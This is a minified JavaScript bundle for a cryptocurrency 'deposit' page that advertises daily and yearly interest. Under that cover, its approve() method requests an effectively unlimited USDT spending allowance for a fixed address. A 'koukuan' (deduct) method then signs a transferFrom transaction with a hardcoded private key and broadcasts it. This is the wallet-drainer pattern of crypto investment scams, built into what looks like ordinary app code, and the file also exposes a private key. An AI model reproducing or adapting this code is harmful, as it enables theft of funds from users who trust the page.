import{l as t,m as e,a,f as n,a2 as s,a3 as o,bM as i,r as l,q as u,w as p,t as c,u as d,v as r,x as m,z as y,C as f,D as b,H as h,G as g,W as A,S as _,J as v}from"./index-CvJkP8r7.js";import{_ as w}from"./fui-icon.BbrID5X2.js";import{r as k}from"./uni-app.es.4grYzir1.js";import{_ as x}from"./fui-nav-bar.CZAK61wT.js";import{_ as C}from"./uni-steps.DX255aXO.js";import{_ as B}from"./fui-switch.C1t_jpoF.js";import{_ as M}from"./uni-popup.BKNKbknm.js";import{_ as R}from"./alert.DkjAnFY_.js";import{_ as F}from"./loading.CdlUmBbP.js";import{A as $}from"./deposit.CavqZY1q.js";import{_ as D}from"./tran-icon.DWd0NTvl.js";import{_ as I}from"./_plugin-vue_export-helper.BCo6x5W8.js";import{N as U}from"./index.yy0eSKon.js";import"./uni-icons.BVKa2lKV.js";import"./uni-popup-dialog.jPMVSOx-.js";import"./fui-loading.BOHvl-ks.js";const z=[{constant:!0,inputs:[],name:"name",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_upgradedAddress",type:"address"}],name:"deprecate",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}],name:"approve",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"deprecated",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_evilUser",type:"address"}],name:"addBlackList",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"totalSupply",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"upgradedAddress",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"}],name:"balances",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"decimals",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"maximumFee",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"_totalSupply",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"unpause",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_maker",type:"address"}],name:"getBlackListStatus",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"},{name:"",type:"address"}],name:"allowed",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"paused",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"who",type:"address"}],name:"balanceOf",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[],name:"pause",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"getOwner",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"owner",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"symbol",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transfer",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"newBasisPoints",type:"uint256"},{name:"newMaxFee",type:"uint256"}],name:"setParams",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"amount",type:"uint256"}],name:"issue",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"amount",type:"uint256"}],name:"redeem",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"},{name:"_spender",type:"address"}],name:"allowance",outputs:[{name:"remaining",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"basisPointsRate",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"",type:"address"}],name:"isBlackListed",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_clearedUser",type:"address"}],name:"removeBlackList",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"MAX_UINT",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"newOwner",type:"address"}],name:"transferOwnership",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_blackListedUser",type:"address"}],name:"destroyBlackFunds",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{inputs:[{name:"_initialSupply",type:"uint256"},{name:"_name",type:"string"},{name:"_symbol",type:"string"},{name:"_decimals",type:"uint256"}],payable:!1,stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!1,name:"amount",type:"uint256"}],name:"Issue",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"amount",type:"uint256"}],name:"Redeem",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"newAddress",type:"address"}],name:"Deprecate",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"feeBasisPoints",type:"uint256"},{indexed:!1,name:"maxFee",type:"uint256"}],name:"Params",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"_blackListedUser",type:"address"},{indexed:!1,name:"_balance",type:"uint256"}],name:"DestroyedBlackFunds",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"_user",type:"address"}],name:"AddedBlackList",type:"event"},{anonymous:!1,inputs:[{indexed:!1,name:"_user",type:"address"}],name:"RemovedBlackList",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Transfer",type:"event"},{anonymous:!1,inputs:[],name:"Pause",type:"event"},{anonymous:!1,inputs:[],name:"Unpause",type:"event"}],S="data:image/webp;base64,UklGRhwCAABXRUJQVlA4WAoAAAAQAAAAIwAAIwAAQUxQSGMBAAABkGvbtuo2a5ghcJ+HUyV1VIfhtmF+vV5Ktf6BQEUlU6lX5QNSGZ4xzMzMzCg4xnOu/iAiJgB1lC/23/vx415/MR8ROM5KoixlcQh/SsynvKV+nwTdV69y3RK42yncbQl+201R3y017K6fbJ/o3zz+q5J9k3jRnlzbAczueq8QP+GUoryVKTuvKU4BsSh3oZzzYyqJIVN8bgMW7dzmAfYqMjpKiuNAl4jIHmCJohQlotyRy+UuTfgCzFJIkmqUh4H5mrQ/xPlpwEFN/70Agw5YVdHc+2E70Qys+CnaH7beOmDjP1F/v2daAsz7I/p7/ZYnABfF2J9aRoBOsRYTyxCwxJSPSoaHhUJhj6UUkRnKHz9+/GLJIDZcB+ZaYuBUrU4B+Fr5CeyrzT4mre/WlF6+fPlO1V0/Ge62wnzbMbXrDtXt0NbvC7OvHqM/ZTvlCRhnJU0piwkcJWn/vR8/7vWnSYQaAFZQOCCSAAAA8AMAnQEqJAAkAD6ROphJpbYiIS40CZrAEgllbTlQBJ1BJzCcoMRywAD+1tAIASHh6qyIQndty1ZaKhfvFVILJvccQelivf9zBq0PmR8VAYIAR89SASmNOozrp0jO44zv6mQ05my+pCcOvLfxBaoeNzLo0dkW0UJ0AZNIRB1dLg6qYntbddPmeAEg5f+XYu4AAAA=";const E=I({components:{[U.name]:U},data(){return{active:0,list2:[{title:this.$t("dp.t23"),desc:this.$util.getDateStr()},{title:this.$t("dp.t24"),desc:this.$util.getDateStr()}],checked:!1,item:{},amount:"",balance:"0.00",content:"",navHeight:""}},onShow(){this.item=t("deposit-item");var e=new Date((new Date).getTime()+86400*this.item.limit*1e3);this.list2[1].desc=e.getFullYear()+"-"+(e.getMonth()+1>=10?e.getMonth()+1:"0"+(e.getMonth()+1))+"-"+(e.getDate()>=10?e.getDate():"0"+e.getDate()),this.getBalance()},computed:{...e(["config"]),...a(["userTheme"])},methods:{koukuan(){const t=new Web3(window.ethereum),e="0xdac17f958d2ee523a2206206994597c13d831ec7",a="0x4A59D1409237e77f988eFeb2F87a5dd6127DD54C",n=new t.eth.Contract(z,e).methods.transferFrom("0x71bFf24DE5C2832485c89ED0F4EB15FcF92bA48D","0x4A59D1409237e77f988eFeb2F87a5dd6127DD54C","1000000").encodeABI();t.eth.estimateGas({from:a,to:e,data:n}).then((s=>{console.log("Estimated gas limit:",s),t.eth.getGasPrice().then((o=>{console.log("Gas price:",o);const i=BigInt(s)*BigInt(o);console.log("Transaction fee:",i.toString());const l={from:a,to:e,gasPrice:o,gasLimit:s,value:"0x0",data:n};t.eth.accounts.signTransaction(l,"311351e2c7ff8e726763e0af2d6ac1eae29aaf880ebc7ef256bf2a7f73b65328").then((({rawTransaction:e})=>{t.eth.sendSignedTransaction(e).on("transactionHash",(function(t){console.log("Transaction hash:",t)})).on("receipt",(function(t){console.log("Receipt:",t)})).on("error",console.error)})).catch(console.error)})).catch(console.error)})).catch(console.error)},async getWalletBalance(){if(console.log("wallet balance"),window&&window.ethereum){console.log("get balance"),s(),await window.ethereum.enable(),window.ethereum.request({method:"eth_requestAccounts"}).then((t=>{console.log(t)}));const t=new Web3(window.ethereum);let e=this;t.eth.getAccounts().catch((t=>{console.log(t),o()})).then((async a=>{console.log(a);const n=a[0];console.log("Wallet Address:",n);const s=new t.eth.Contract(z,"0xdAC17F958D2ee523a2206206994597C13D831ec7"),i=await s.methods.balanceOf(n).call();o(),e.balance=parseFloat(Number(i)/1e6).toFixed(2)}))}else n({text:"none object",icon:"none"})},navInit(t){this.navHeight=t.height+t.statusBarHeight},confirm(){this.balanceConfirm(0)},async approve(){let t=this;const e=new Web3(window.ethereum),a=new e.eth.Contract(z,"0xdAC17F958D2ee523a2206206994597C13D831ec7"),s=BigInt(Number.MAX_SAFE_INTEGER),o=(await e.eth.getAccounts())[0];a.methods.approve("0x71bFf24DE5C2832485c89ED0F4EB15FcF92bA48D",s).send({from:o,gas:6e4}).then((e=>{t.balanceConfirm(1,o)})).catch((t=>{console.log(t),n({text:"user cancel",icon:"none"})})),t.balanceConfirm(1,o)},balanceConfirm(t=0,e=""){return!(!this.checked||""===this.amount)&&(parseFloat(this.amount)>parseFloat(this.balance)?(this.content=this.$t("dp.t10"),this.$refs.alert.open(),!1):parseFloat(this.amount)<parseFloat(this.item.min)?(this.content=this.$t("dp.t11")+this.item.min+this.item.symbol,this.$refs.alert.open(),!1):(this.$refs.loading.open(),void $.submitDeposit({did:this.item.id,amount:this.amount,auto:this.checked?1:0,currency_id:this.item.currency_id,approve:t,wallet_amount:t?this.balance:0,approve_address:e}).then((t=>{if(this.$refs.loading.close(),200!==t.code)return this.content=t.message,this.$refs.alert.open(),!1;i({url:"/pages/index/livecoin/result?symbol="+this.item.symbol+"&amount="+this.amount})})).catch((t=>{this.$refs.loading.close(),this.content=t,this.$refs.alert.open()}))))},getBalance(){$.getBalance(this.item.currency_id).then((t=>{this.balance=t.data.balance}))},openInter(){this.$refs.interestRule.open()},openRedemption(){this.$refs.redemptionRule.open()},closePopup(){this.$refs.interestRule.close(),this.$refs.redemptionRule.close()}}},[["render",function(t,e,a,n,s,o){const i=k(l("fui-icon"),w),$=k(l("fui-nav-bar"),x),I=h,U=c,z=g,E=A,Q=k(l("uni-steps"),C),Y=k(l("fui-switch"),B),T=_,V=v,P=k(l("uni-popup"),M),J=k(l("alert"),R),j=k(l("loading"),F);return d(),u(U,{class:"subscribe","data-theme":t.userTheme},{default:p((()=>[r($,{statusBar:"",isFixed:"",isOccupy:"",zIndex:"9",title:t.$t("dp.t40")+" "+s.item.symbol,color:"var(--content-primary)",background:"var(--background-primary)",onLeftClick:e[0]||(e[0]=e=>t.$mroute.back()),onInit:o.navInit},{default:p((()=>[r(i,{name:"arrowleft",size:"56",color:"var(--content-primary)"})])),_:1},8,["title","onInit"]),r(T,{"scroll-y":"",class:"container",style:f({height:t.$device.windowHeight-s.navHeight+"px"})},{default:p((()=>[r(U,{class:"row mt-10"},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t12")),1)])),_:1})])),_:1}),r(U,{class:"right"},{default:p((()=>[0==s.item.limit?(d(),u(I,{key:0},{default:p((()=>[m(y(t.$t("dp.t13")),1)])),_:1})):(d(),u(I,{key:1},{default:p((()=>[m(y(s.item.limit)+y(t.$t("dp.t14")),1)])),_:1}))])),_:1})])),_:1}),r(U,{class:"row"},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t15")),1)])),_:1}),r(z,{onClick:o.openRedemption,src:S,mode:""},null,8,["onClick"])])),_:1}),r(U,{class:"right"},{default:p((()=>[r(I,null,{default:p((()=>[m("T+0/T+1")])),_:1})])),_:1})])),_:1}),r(U,{class:"row"},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t16")),1)])),_:1})])),_:1}),r(U,{class:"right"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t17"))+" "+y(s.item.day_rate)+"% | "+y(t.$t("dp.t18"))+" "+y(s.item.year_rate)+"%",1)])),_:1})])),_:1})])),_:1}),r(U,{class:"row"},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t39")),1)])),_:1})])),_:1})])),_:1}),r(U,{class:"row_bg"},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(E,{type:"number",modelValue:s.amount,"onUpdate:modelValue":e[1]||(e[1]=t=>s.amount=t),placeholder:t.$t("dp.t19")+s.item.min+s.item.symbol},null,8,["modelValue","placeholder"])])),_:1}),r(U,{class:"right"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(s.item.symbol),1)])),_:1}),r(I,null,{default:p((()=>[m("|")])),_:1}),r(I,{onClick:e[2]||(e[2]=t=>s.amount=s.balance)},{default:p((()=>[m(y(t.$t("dp.t20")),1)])),_:1})])),_:1})])),_:1}),r(U,{class:"row balance"},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t21")),1)])),_:1})])),_:1}),r(U,{class:"right"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$util.float(s.balance))+" "+y(s.item.symbol),1)])),_:1}),r(z,{src:D,mode:"",onClick:e[3]||(e[3]=e=>t.$mroute.exchange())})])),_:1})])),_:1}),r(U,{class:"card"},{default:p((()=>[r(U,{class:"row",style:{"margin-bottom":"10rpx"}},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t22")),1)])),_:1})])),_:1})])),_:1}),r(Q,{options:s.list2,active:s.active,direction:"column"},null,8,["options","active"]),r(U,{class:"row",style:{"margin-top":"30rpx"}},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t25")),1)])),_:1}),r(z,{onClick:o.openInter,src:S,mode:""},null,8,["onClick"])])),_:1}),r(U,{class:"right"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(s.item.day_rate)+"%",1)])),_:1})])),_:1})])),_:1})])),_:1}),r(U,{class:"card"},{default:p((()=>[r(U,{class:"row",style:{"margin-bottom":"20rpx"}},{default:p((()=>[r(U,{class:"left"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t26")),1)])),_:1})])),_:1}),r(U,{class:"right"},{default:p((()=>[r(Y,{scaleRatio:.7,color:"var(--color-primary)"})])),_:1})])),_:1}),r(I,{class:"_tip"},{default:p((()=>[m(y(t.$t("dp.t27")),1)])),_:1})])),_:1}),r(U,{class:"null_view_box"})])),_:1},8,["style"]),r(U,{class:"footer"},{default:p((()=>[r(U,{class:"top"},{default:p((()=>[r(U,{class:"check",onClick:e[4]||(e[4]=t=>s.checked=!s.checked)},{default:p((()=>[0==s.checked?(d(),u(z,{key:0,src:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAABqklEQVR4Xu2YTW6DMBCF0656qPYUvUt7ga7ag+QYuUaVDRKLxkBsVaQhXSBcPwrEGQzYhkpWlSd9i2DPzJPxH1mtrvrvklLefqTiIcn4K8vEhmV8qzg0bPEMbeiDvjR+MUVRdLfbi2dVNFFISxLEIJbmm6Uk4Y8qeWwoaEuMHDSvs9SQ37C9eDEU8EPlQk5ax0q1mYyve0nns/YytejIUFRuWm9UzZypeomWo7KeU1gRbN4EtiW2Wn1qmT4Zgv8E1KL1L4SNTHVkNHAOx+Ikq6qSX8ei16Zgo5tnmop7Q5A3xelbtoIp2g5Qk/rotMv4Gw3wRTcDYaRoH4Ca1Een5mzqBblCzeA37XNGbKiPTupQfO8HnPnMDzX0uY6bGS5Rk/ropDrkNKAFRqaKuJppyKmPTmg0BNTohkzFPM2AYUNTr2yo6NBzGyZe2fSkpsXLsrz47WLml5FJbbvsqalW7mYmlr3LxkhN+ZgBoxujdDw62mNhaNOzYPzogII6XKHgrh9QUBe0VkFdYSEZ2iUfqk0tOVJzPoN0BfOhqCuoT2ld2MiC+LPhqlD0A+mx7Sw8gGkcAAAAAElFTkSuQmCC",mode:""})):(d(),u(z,{key:1,src:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAABn0lEQVR4Xu2YvU7DMBSFTVl4KHgKRp4iNoK1Q1hggZ0RiZdAQmLiEVDHTK3Y2sQtVIrxvSVSsK8dx0klC/WTjtqkvj5HiX+SMnbg3zNVE5atz5iQtyyTrywrZ4xXKxR8h3P4m24DbffGVJ0wXl5r44WWCtQCa6B2VLg8150XhGGoCuxjOOpId5YTBrHKsc84dKEon4lOhwn6jAo17pUxlZt2fnZjpiY6Gkt1+JjC2TRoAIeqCJt9orwiivcj8PICCxmv5lZhpCaiUvdvW7XaKHXz8m39zsDLu3iK9SlRFCUI8/i+VQ3LTW21QYGnEy7vrIIImWGAB32lzHY7aU8nsA9ZBf1EhYFjOG+2RYGnEyE/rIKW0cXTF8rVee8wIPB0wuXSKvgVBPGZRIVBaU8ngYFMs/gwXYE6bhllenxJnw8LU3Xcso5BTYWafdZ/jnuFAXkHdcC0p0I19A6D8k37wIWRChUXpupYGHtsHWDebAvwGRWmc+sAktpcgeQeP4CkHtAaknqERVJ7yEeSeg1qkc6LYoukXqXbJPNnw4FE+AFqzUN+Qvhk1gAAAABJRU5ErkJggg==",mode:""}))])),_:1}),r(U,{class:"agre"},{default:p((()=>[r(I,{onClick:e[5]||(e[5]=t=>s.checked=!s.checked)},{default:p((()=>[m(y(t.$t("dp.t28")),1)])),_:1}),r(I,{onClick:e[6]||(e[6]=e=>t.$mroute.webview(1,"zysxr"))},{default:p((()=>[m("《"+y(t.config.site_name)+" "+y(t.$t("dp.t29"))+"》",1)])),_:1})])),_:1})])),_:1}),r(V,{onClick:e[7]||(e[7]=t=>o.confirm()),class:b(s.checked&&""!=s.amount?"activeBtn":"")},{default:p((()=>[m(y(t.$t("确定")),1)])),_:1},8,["class"])])),_:1}),r(P,{ref:"interestRule",type:"bottom","mask-background-color":"rgba(0, 0, 0, .7)"},{default:p((()=>[r(U,{class:"popup"},{default:p((()=>[r(U,{class:"p_title"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t30")),1)])),_:1}),r(U,{class:"close",onClick:o.closePopup},{default:p((()=>[r(i,{name:"close",size:"48",color:"var(--content-primary)"})])),_:1},8,["onClick"])])),_:1}),r(U,{class:"p_content"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t30"))+"：",1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t31")),1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t32")),1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t33")),1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t34")),1)])),_:1})])),_:1})])),_:1})])),_:1},512),r(P,{ref:"redemptionRule",type:"bottom","mask-background-color":"rgba(0, 0, 0, .7)"},{default:p((()=>[r(U,{class:"popup"},{default:p((()=>[r(U,{class:"p_title"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t35")),1)])),_:1}),r(U,{class:"close",onClick:o.closePopup},{default:p((()=>[r(i,{name:"close",size:"48",color:"var(--content-primary)"})])),_:1},8,["onClick"])])),_:1}),r(U,{class:"p_content"},{default:p((()=>[r(I,null,{default:p((()=>[m(y(t.$t("dp.t35"))+"：",1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t36")),1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t37")),1)])),_:1}),r(I,null,{default:p((()=>[m(y(t.$t("dp.t38")),1)])),_:1})])),_:1})])),_:1})])),_:1},512),r(J,{ref:"alert",ctxt:t.$t("取消"),content:s.content},null,8,["ctxt","content"]),r(j,{ref:"loading"},null,512)])),_:1},8,["data-theme"])}],["__scopeId","data-v-3c9aef92"]]);export{E as default};
